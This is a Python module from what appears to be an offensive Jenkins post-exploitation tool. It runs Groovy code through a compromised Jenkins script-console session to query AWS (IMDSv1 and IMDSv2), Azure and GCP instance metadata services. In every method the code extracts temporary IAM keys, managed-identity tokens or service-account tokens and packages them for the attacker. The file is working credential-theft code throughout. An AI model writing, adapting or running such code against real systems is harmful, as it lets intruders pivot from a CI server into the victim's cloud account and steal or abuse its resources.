"""Cloud instance metadata service (IMDS) credential extraction.

Supports AWS (IMDSv1 & IMDSv2), Azure, and GCP metadata endpoints
for extracting temporary cloud credentials and instance information.
"""

from dataclasses import dataclass
from enum import Enum
from typing import Any, Optional


class CloudProvider(Enum):
    """Supported cloud providers."""
    AWS = "aws"
    AZURE = "azure"
    GCP = "gcp"
    UNKNOWN = "unknown"


@dataclass
class CloudCredentials:
    """Cloud provider credentials."""
    provider: CloudProvider
    access_key: Optional[str] = None
    secret_key: Optional[str] = None
    token: Optional[str] = None
    role_name: Optional[str] = None
    account_id: Optional[str] = None
    region: Optional[str] = None
    metadata: dict[str, Any] = None

    def __post_init__(self):
        if self.metadata is None:
            self.metadata = {}


class MetadataExtractor:
    """Extracts credentials from cloud instance metadata services."""

    AWS_IMDS_V1 = "http://169.254.169.254/latest/meta-data/"
    AWS_IMDS_V2_TOKEN_URL = "http://169.254.169.254/latest/api/token"
    AZURE_IMDS = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    GCP_METADATA = "http://metadata.google.internal/computeMetadata/v1/"

    def __init__(self, session: Any):
        """Initialize metadata extractor.

        Args:
            session: Authenticated Jenkins session for Groovy execution
        """
        self.session = session

    def detect_provider(self) -> CloudProvider:
        """Detect which cloud provider the instance is running on.

        Returns:
            CloudProvider enum value
        """
        if self._check_aws():
            return CloudProvider.AWS
        elif self._check_azure():
            return CloudProvider.AZURE
        elif self._check_gcp():
            return CloudProvider.GCP
        else:
            return CloudProvider.UNKNOWN

    def _check_aws(self) -> bool:
        """Check if running on AWS."""
        groovy_code = f"""
try {{
    def url = new URL('{self.AWS_IMDS_V1}')
    def conn = url.openConnection()
    conn.setConnectTimeout(2000)
    conn.setReadTimeout(2000)
    def code = conn.getResponseCode()
    println code == 200 || code == 401
}} catch (Exception e) {{
    println false
}}
"""
        result = self.session.execute_groovy(groovy_code)
        return "true" in result.lower()

    def _check_azure(self) -> bool:
        """Check if running on Azure."""
        groovy_code = f"""
try {{
    def url = new URL('{self.AZURE_IMDS}')
    def conn = url.openConnection()
    conn.setRequestProperty("Metadata", "true")
    conn.setConnectTimeout(2000)
    conn.setReadTimeout(2000)
    def code = conn.getResponseCode()
    println code == 200
}} catch (Exception e) {{
    println false
}}
"""
        result = self.session.execute_groovy(groovy_code)
        return "true" in result.lower()

    def _check_gcp(self) -> bool:
        """Check if running on GCP."""
        groovy_code = f"""
try {{
    def url = new URL('{self.GCP_METADATA}')
    def conn = url.openConnection()
    conn.setRequestProperty("Metadata-Flavor", "Google")
    conn.setConnectTimeout(2000)
    conn.setReadTimeout(2000)
    def code = conn.getResponseCode()
    println code == 200
}} catch (Exception e) {{
    println false
}}
"""
        result = self.session.execute_groovy(groovy_code)
        return "true" in result.lower()

    def extract_aws_imdsv1(self) -> Optional[CloudCredentials]:
        """Extract AWS credentials via IMDSv1 (legacy, no token required).

        Returns:
            CloudCredentials object if successful
        """
        groovy_code = f"""
import groovy.json.JsonSlurper

try {{
    def roleName = new URL('{self.AWS_IMDS_V1}iam/security-credentials/').text.trim()

    if (!roleName) {{
        println "NO_ROLE"
        return
    }}

    def credUrl = '{self.AWS_IMDS_V1}iam/security-credentials/' + roleName
    def credJson = new URL(credUrl).text

    def regionUrl = '{self.AWS_IMDS_V1}placement/region'
    def region = new URL(regionUrl).text.trim()

    def accountUrl = '{self.AWS_IMDS_V1}identity-credentials/ec2/info'
    def accountJson = ""
    try {{
        accountJson = new URL(accountUrl).text
    }} catch (Exception e) {{}}

    println "ROLE:" + roleName
    println "CREDS:" + credJson
    println "REGION:" + region
    if (accountJson) {{
        println "ACCOUNT:" + accountJson
    }}
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "NO_ROLE" in result or "ERROR" in result:
            return None

        lines = result.strip().split('\n')
        role_name = None
        creds_json = None
        region = None

        for line in lines:
            if line.startswith("ROLE:"):
                role_name = line.split("ROLE:", 1)[1].strip()
            elif line.startswith("CREDS:"):
                creds_json = line.split("CREDS:", 1)[1].strip()
            elif line.startswith("REGION:"):
                region = line.split("REGION:", 1)[1].strip()

        if creds_json:
            import json
            try:
                creds = json.loads(creds_json)
                return CloudCredentials(
                    provider=CloudProvider.AWS,
                    access_key=creds.get("AccessKeyId"),
                    secret_key=creds.get("SecretAccessKey"),
                    token=creds.get("Token"),
                    role_name=role_name,
                    region=region,
                    metadata=creds
                )
            except json.JSONDecodeError:
                pass

        return None

    def extract_aws_imdsv2(self) -> Optional[CloudCredentials]:
        """Extract AWS credentials via IMDSv2 (token-based).

        Returns:
            CloudCredentials object if successful
        """
        groovy_code = f"""
import groovy.json.JsonSlurper

try {{
    def tokenUrl = new URL('{self.AWS_IMDS_V2_TOKEN_URL}')
    def tokenConn = tokenUrl.openConnection()
    tokenConn.setRequestMethod("PUT")
    tokenConn.setRequestProperty("X-aws-ec2-metadata-token-ttl-seconds", "21600")
    def token = tokenConn.getInputStream().text.trim()

    def getRoleUrl = new URL('{self.AWS_IMDS_V1}iam/security-credentials/')
    def getRoleConn = getRoleUrl.openConnection()
    getRoleConn.setRequestProperty("X-aws-ec2-metadata-token", token)
    def roleName = getRoleConn.getInputStream().text.trim()

    if (!roleName) {{
        println "NO_ROLE"
        return
    }}

    def credUrl = new URL('{self.AWS_IMDS_V1}iam/security-credentials/' + roleName)
    def credConn = credUrl.openConnection()
    credConn.setRequestProperty("X-aws-ec2-metadata-token", token)
    def credJson = credConn.getInputStream().text

    def regionUrl = new URL('{self.AWS_IMDS_V1}placement/region')
    def regionConn = regionUrl.openConnection()
    regionConn.setRequestProperty("X-aws-ec2-metadata-token", token)
    def region = regionConn.getInputStream().text.trim()

    println "ROLE:" + roleName
    println "CREDS:" + credJson
    println "REGION:" + region
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "NO_ROLE" in result or "ERROR" in result:
            return None

        lines = result.strip().split('\n')
        role_name = None
        creds_json = None
        region = None

        for line in lines:
            if line.startswith("ROLE:"):
                role_name = line.split("ROLE:", 1)[1].strip()
            elif line.startswith("CREDS:"):
                creds_json = line.split("CREDS:", 1)[1].strip()
            elif line.startswith("REGION:"):
                region = line.split("REGION:", 1)[1].strip()

        if creds_json:
            import json
            try:
                creds = json.loads(creds_json)
                return CloudCredentials(
                    provider=CloudProvider.AWS,
                    access_key=creds.get("AccessKeyId"),
                    secret_key=creds.get("SecretAccessKey"),
                    token=creds.get("Token"),
                    role_name=role_name,
                    region=region,
                    metadata=creds
                )
            except json.JSONDecodeError:
                pass

        return None

    def extract_azure_credentials(self) -> Optional[CloudCredentials]:
        """Extract Azure managed identity credentials.

        Returns:
            CloudCredentials object if successful
        """
        groovy_code = f"""
import groovy.json.JsonSlurper

try {{
    def instanceUrl = new URL('{self.AZURE_IMDS}')
    def instanceConn = instanceUrl.openConnection()
    instanceConn.setRequestProperty("Metadata", "true")
    def instanceJson = instanceConn.getInputStream().text

    def tokenUrl = new URL('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/')
    def tokenConn = tokenUrl.openConnection()
    tokenConn.setRequestProperty("Metadata", "true")
    def tokenJson = tokenConn.getInputStream().text

    println "INSTANCE:" + instanceJson
    println "TOKEN:" + tokenJson
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "ERROR" in result:
            return None

        lines = result.strip().split('\n')
        instance_json = None
        token_json = None

        for line in lines:
            if line.startswith("INSTANCE:"):
                instance_json = line.split("INSTANCE:", 1)[1].strip()
            elif line.startswith("TOKEN:"):
                token_json = line.split("TOKEN:", 1)[1].strip()

        if token_json:
            import json
            try:
                token_data = json.loads(token_json)
                instance_data = json.loads(instance_json) if instance_json else {}

                return CloudCredentials(
                    provider=CloudProvider.AZURE,
                    token=token_data.get("access_token"),
                    metadata={
                        "token_data": token_data,
                        "instance_data": instance_data
                    }
                )
            except json.JSONDecodeError:
                pass

        return None

    def extract_gcp_credentials(self) -> Optional[CloudCredentials]:
        """Extract GCP service account credentials.

        Returns:
            CloudCredentials object if successful
        """
        groovy_code = f"""
import groovy.json.JsonSlurper

try {{
    def projectUrl = new URL('{self.GCP_METADATA}project/project-id')
    def projectConn = projectUrl.openConnection()
    projectConn.setRequestProperty("Metadata-Flavor", "Google")
    def projectId = projectConn.getInputStream().text.trim()

    def emailUrl = new URL('{self.GCP_METADATA}instance/service-accounts/default/email')
    def emailConn = emailUrl.openConnection()
    emailConn.setRequestProperty("Metadata-Flavor", "Google")
    def email = emailConn.getInputStream().text.trim()

    def tokenUrl = new URL('{self.GCP_METADATA}instance/service-accounts/default/token')
    def tokenConn = tokenUrl.openConnection()
    tokenConn.setRequestProperty("Metadata-Flavor", "Google")
    def tokenJson = tokenConn.getInputStream().text

    def scopesUrl = new URL('{self.GCP_METADATA}instance/service-accounts/default/scopes')
    def scopesConn = scopesUrl.openConnection()
    scopesConn.setRequestProperty("Metadata-Flavor", "Google")
    def scopes = scopesConn.getInputStream().text

    println "PROJECT:" + projectId
    println "EMAIL:" + email
    println "TOKEN:" + tokenJson
    println "SCOPES:" + scopes
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "ERROR" in result:
            return None

        lines = result.strip().split('\n')
        project_id = None
        email = None
        token_json = None
        scopes = None

        for line in lines:
            if line.startswith("PROJECT:"):
                project_id = line.split("PROJECT:", 1)[1].strip()
            elif line.startswith("EMAIL:"):
                email = line.split("EMAIL:", 1)[1].strip()
            elif line.startswith("TOKEN:"):
                token_json = line.split("TOKEN:", 1)[1].strip()
            elif line.startswith("SCOPES:"):
                scopes = line.split("SCOPES:", 1)[1].strip()

        if token_json:
            import json
            try:
                token_data = json.loads(token_json)
                return CloudCredentials(
                    provider=CloudProvider.GCP,
                    token=token_data.get("access_token"),
                    account_id=project_id,
                    metadata={
                        "service_account_email": email,
                        "project_id": project_id,
                        "scopes": scopes,
                        "token_data": token_data
                    }
                )
            except json.JSONDecodeError:
                pass

        return None

    def extract_all(self) -> Optional[CloudCredentials]:
        """Auto-detect provider and extract credentials.

        Returns:
            CloudCredentials object if successful
        """
        provider = self.detect_provider()

        if provider == CloudProvider.AWS:
            creds = self.extract_aws_imdsv2()
            if not creds:
                creds = self.extract_aws_imdsv1()
            return creds
        elif provider == CloudProvider.AZURE:
            return self.extract_azure_credentials()
        elif provider == CloudProvider.GCP:
            return self.extract_gcp_credentials()

        return None


def extract_aws_credentials(session: Any) -> Optional[CloudCredentials]:
    """Quick AWS credential extraction.

    Args:
        session: Jenkins session

    Returns:
        CloudCredentials if found
    """
    extractor = MetadataExtractor(session)
    creds = extractor.extract_aws_imdsv2()
    if not creds:
        creds = extractor.extract_aws_imdsv1()
    return creds


def extract_azure_credentials(session: Any) -> Optional[CloudCredentials]:
    """Quick Azure credential extraction.

    Args:
        session: Jenkins session

    Returns:
        CloudCredentials if found
    """
    extractor = MetadataExtractor(session)
    return extractor.extract_azure_credentials()


def extract_gcp_credentials(session: Any) -> Optional[CloudCredentials]:
    """Quick GCP credential extraction.

    Args:
        session: Jenkins session

    Returns:
        CloudCredentials if found
    """
    extractor = MetadataExtractor(session)
    return extractor.extract_gcp_credentials()
